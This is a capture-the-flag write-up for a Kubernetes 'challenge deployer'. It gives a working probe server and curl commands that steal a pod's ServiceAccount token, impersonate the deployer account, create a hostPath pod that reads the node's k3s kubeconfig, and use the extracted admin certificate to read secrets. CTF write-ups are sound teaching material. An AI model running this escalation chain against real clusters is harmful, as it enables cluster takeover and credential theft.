# CTFaaS - CTFs as a Service!

**Category:** misc

---

#### Description

We are given access to a “CTF Challenge Deployer” web UI on a provisioned VM. It accepts a Docker image tarball and exposes a chosen container port via a NodePort. The challenge claims a “Secret in the cluster” contains the company keys (flag), and that sandboxing/RBAC prevents malicious actions.

#### Solution

The core issue is that uploaded images run as pods inside the Kubernetes cluster with a ServiceAccount token. That token can *impersonate* the deployer’s ServiceAccount (`ctf-deployer-sa`). As `ctf-deployer-sa`, we can create pods in `default` and mount a `hostPath` to `/`, which lets us read host files. On k3s, `/etc/rancher/k3s/k3s.yaml` is a kubeconfig containing a client certificate+key that has high privileges. Using those credentials against the apiserver, we can directly read the secret in the hidden namespace and recover the flag.

Steps (commands shown for the instance VM IP `35.219.138.219`):

1. Deploy a probe container so we can read the in-pod ServiceAccount token and talk to the apiserver from inside the cluster.

Probe image code (Dockerfile + server):

```dockerfile
FROM python:3.11-slim

RUN useradd -m app
WORKDIR /app
COPY server.py /app/server.py

USER app
ENV PYTHONUNBUFFERED=1
EXPOSE 8000
CMD ["python", "/app/server.py"]
```

```python
#!/usr/bin/env python3
import base64
import concurrent.futures
import http.client
import json
import os
import socket
import ssl
import sys
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

SA_DIR = "/var/run/secrets/kubernetes.io/serviceaccount"
TOKEN_PATH = os.path.join(SA_DIR, "token")
CA_PATH = os.path.join(SA_DIR, "ca.crt")
NS_PATH = os.path.join(SA_DIR, "namespace")

API = os.environ.get("KUBE_API", "https://kubernetes.default.svc")


def _read(path, default=""):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read().strip()
    except Exception:
        return default


def _default_gw() -> str:
    try:
        with open("/proc/net/route", "r", encoding="utf-8") as f:
            for line in f.read().splitlines()[1:]:
                parts = line.split()
                if len(parts) < 3:
                    continue
                dest, gw = parts[1], parts[2]
                if dest != "00000000":
                    continue
                b = bytes.fromhex(gw)
                ip = ".".join(str(x) for x in b[::-1])
                if ip:
                    return ip
    except Exception:
        pass
    return ""


def tcp_connect(host: str, port: int, timeout: float = 1.0) -> dict:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def tcp_exchange(host: str, port: int, send: bytes = b"", timeout: float = 1.0, recv_bytes: int = 4096) -> dict:
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            if send:
                s.sendall(send)
            try:
                data = s.recv(recv_bytes)
            except socket.timeout:
                data = b""
            return {"ok": True, "recv_b64": base64.b64encode(data).decode(), "recv_len": len(data)}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def http_fetch(url: str, timeout: float = 5.0, insecure: bool = False, headers: dict | None = None, max_bytes: int = 64 * 1024) -> dict:
    if not (url.startswith("http://") or url.startswith("https://")):
        return {"ok": False, "error": "only http(s) supported"}
    req = urllib.request.Request(url, method="GET")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    ctx = None
    if url.startswith("https://"):
        ctx = ssl._create_unverified_context() if insecure else ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read(max_bytes)
            return {
                "ok": True,
                "status": resp.status,
                "headers": dict(resp.headers),
                "body_b64": base64.b64encode(body).decode(),
                "body_truncated": resp.length is not None and resp.length > max_bytes,
                "url": resp.geturl(),
            }
    except Exception as e:
        return {"ok": False, "error": str(e)}


def k8s_request(method, path, body=None, headers=None):
    token = _read(TOKEN_PATH)
    if not token:
        raise RuntimeError("No serviceaccount token mounted")

    url = API.rstrip("/") + path
    data = None
    if body is not None:
        data = json.dumps(body).encode("utf-8")

    req = urllib.request.Request(url, method=method)
    req.add_header("Authorization", "Bearer " + token)
    req.add_header("Accept", "application/json")
    if data is not None:
        req.add_header("Content-Type", "application/json")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)

    ctx = ssl.create_default_context(cafile=CA_PATH if os.path.exists(CA_PATH) else None)
    try:
        with urllib.request.urlopen(req, data=data, context=ctx, timeout=10) as resp:
            raw = resp.read()
            ctype = resp.headers.get("content-type", "")
            return resp.status, ctype, raw
    except urllib.error.HTTPError as e:
        raw = e.read()
        return e.code, e.headers.get("content-type", ""), raw


def k8s_request_dupheaders(method, path, body=None, header_items=None):
    token = _read(TOKEN_PATH)
    if not token:
        raise RuntimeError("No serviceaccount token mounted")

    api = urllib.parse.urlparse(API)
    host = api.hostname or "kubernetes.default.svc"
    port = api.port or (443 if api.scheme == "https" else 80)

    data = None
    if body is not None:
        data = json.dumps(body).encode("utf-8")

    ctx = ssl.create_default_context(cafile=CA_PATH if os.path.exists(CA_PATH) else None)
    conn_cls = http.client.HTTPSConnection if api.scheme == "https" else http.client.HTTPConnection
    conn = conn_cls(host, port, timeout=10, context=ctx if api.scheme == "https" else None)
    try:
        conn.putrequest(method, path)
        base = [
            ("Authorization", "Bearer " + token),
            ("Accept", "application/json"),
        ]
        if data is not None:
            base.append(("Content-Type", "application/json"))
        for k, v in base:
            conn.putheader(k, v)
        for k, v in (header_items or []):
            conn.putheader(k, v)
        conn.endheaders()
        if data is not None:
            conn.send(data)
        resp = conn.getresponse()
        raw = resp.read()
        ctype = resp.getheader("content-type", "")
        return resp.status, ctype, raw
    finally:
        conn.close()


def k8s_get_json(path):
    st, ctype, raw = k8s_request("GET", path)
    try:
        return st, json.loads(raw.decode("utf-8", errors="replace"))
    except Exception:
        return st, {"_raw": raw.decode("utf-8", errors="replace"), "_content_type": ctype}


def k8s_post_json(path, body):
    st, ctype, raw = k8s_request("POST", path, body=body)
    try:
        return st, json.loads(raw.decode("utf-8", errors="replace"))
    except Exception:
        return st, {"_raw": raw.decode("utf-8", errors="replace"), "_content_type": ctype}


class Handler(BaseHTTPRequestHandler):
    def _send(self, code, body, ctype="application/json"):
        if isinstance(body, (dict, list)):
            raw = json.dumps(body, indent=2, sort_keys=True).encode("utf-8")
        elif isinstance(body, (bytes, bytearray)):
            raw = bytes(body)
        else:
            raw = str(body).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        if self.path == "/" or self.path.startswith("/?"):
            info = {
                "pod": os.environ.get("HOSTNAME"),
                "namespace": _read(NS_PATH, "unknown"),
                "has_sa_token": os.path.exists(TOKEN_PATH),
                "kube_api": API,
                "kube_host_env": os.environ.get("KUBERNETES_SERVICE_HOST"),
                "pod_ip": (_read("/etc/hosts").splitlines()[-1].split()[0] if _read("/etc/hosts") else None),
                "default_gw": _default_gw() or None,
            }
            self._send(200, info)
            return

        if self.path.startswith("/read"):
            q = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(q)
            p = params.get("path", [""])[0]
            if not p or not p.startswith("/"):
                self._send(400, {"error": "path must be absolute"})
                return
            try:
                with open(p, "rb") as f:
                    raw = f.read(64 * 1024)
            except Exception as e:
                self._send(500, {"error": str(e)})
                return
            self._send(200, raw, ctype="text/plain; charset=utf-8")
            return

        if self.path.startswith("/k8s-imp"):
            q = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(q)
            p = params.get("path", [""])[0]
            sa = params.get("sa", ["ctf-deployer-sa"])[0]
            ns = params.get("ns", [_read(NS_PATH, "default")])[0]
            if not p.startswith("/"):
                self._send(400, {"error": "path must start with /"})
                return
            user = f"system:serviceaccount:{ns}:{sa}"
            hdr_items = [("Impersonate-User", user)]
            st, ctype, raw = k8s_request_dupheaders("GET", p, header_items=hdr_items)
            try:
                obj = json.loads(raw.decode("utf-8", errors="replace"))
            except Exception:
                obj = {"_raw": raw.decode("utf-8", errors="replace"), "_content_type": ctype}
            self._send(st, obj)
            return

        self._send(404, {"error": "not found"})

    def do_POST(self):
        if self.path.startswith("/ssrr"):
            ns = _read(NS_PATH, "default")
            st, obj = k8s_post_json(
                "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
                {"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview", "spec": {"namespace": ns}},
            )
            self._send(st, obj)
            return
        self._send(404, {"error": "not found"})

    def log_message(self, fmt, *args):
        sys.stderr.write("%s - - [%s] %s\n" % (self.client_address[0], self.log_date_time_string(), fmt % args))


def main():
    port = int(os.environ.get("PORT", "8000"))
    httpd = HTTPServer(("0.0.0.0", port), Handler)
    print(f"listening on :{port}", flush=True)
    httpd.serve_forever()


if __name__ == "__main__":
    main()
```

Deploy it via the web UI (or with curl), then note the resulting NodePort URL (example: `http://35.219.138.219:32483/`). From that URL, read the in-pod token:

```bash
PROBE=http://35.219.138.219:32483
TOKEN="$(curl -sS "$PROBE/read?path=/var/run/secrets/kubernetes.io/serviceaccount/token")"
```

2. Confirm the interesting permission: `ctf-app` can impersonate `ctf-deployer-sa`:

```bash
curl -sS -k -H "Authorization: Bearer $TOKEN" \
  https://35.219.138.219:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H 'Content-Type: application/json' \
  --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

3. Use that to create a pod *as* `ctf-deployer-sa` with a `hostPath` mount of `/` and read the host’s k3s kubeconfig (`/etc/rancher/k3s/k3s.yaml`). This file contains `client-certificate-data` and `client-key-data`.

```bash
cat > pod.json <<'JSON'
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": { "name": "dumpkube" },
  "spec": {
    "restartPolicy": "Never",
    "containers": [{
      "name": "c",
      "image": "10.43.254.254:5000/challenge-<your_challenge_id>:latest",
      "command": ["sh","-c","cat /host/etc/rancher/k3s/k3s.yaml"],
      "volumeMounts": [{ "name": "host", "mountPath": "/host", "readOnly": true }]
    }],
    "volumes": [{ "name": "host", "hostPath": { "path": "/", "type": "Directory" } }]
  }
}
JSON

curl -sS -k -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: system:serviceaccount:default:ctf-deployer-sa" \
  -H 'Content-Type: application/json' \
  --data @pod.json \
  https://35.219.138.219:6443/api/v1/namespaces/default/pods

curl -sS -k -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: system:serviceaccount:default:ctf-deployer-sa" \
  'https://35.219.138.219:6443/api/v1/namespaces/default/pods/dumpkube/log' > k3s.yaml
```

4. Extract the client cert/key from `k3s.yaml` and use them to access the hidden namespace and read the secret:

```bash
python3 - <<'PY'
import base64, re, pathlib
s = pathlib.Path("k3s.yaml").read_text()
def grab(k):
  m = re.search(rf"{k}:\\s*([A-Za-z0-9+/=]+)", s)
  return base64.b64decode(m.group(1))
pathlib.Path("client.crt").write_bytes(grab("client-certificate-data"))
pathlib.Path("client.key").write_bytes(grab("client-key-data"))
PY

curl -sS -k --cert client.crt --key client.key \
  https://35.219.138.219:6443/api/v1/namespaces/hidden-vault/secrets | jq -r '.items[].metadata.name'

curl -sS -k --cert client.crt --key client.key \
  https://35.219.138.219:6443/api/v1/namespaces/hidden-vault/secrets/real-flag \
  | jq -r '.data.flag' | base64 -d
```

This outputs the flag:

```
lactf{0h_n0_y0u_h4ck3d_my_p34f3c7ly_s3cur3_c7us73r}
```
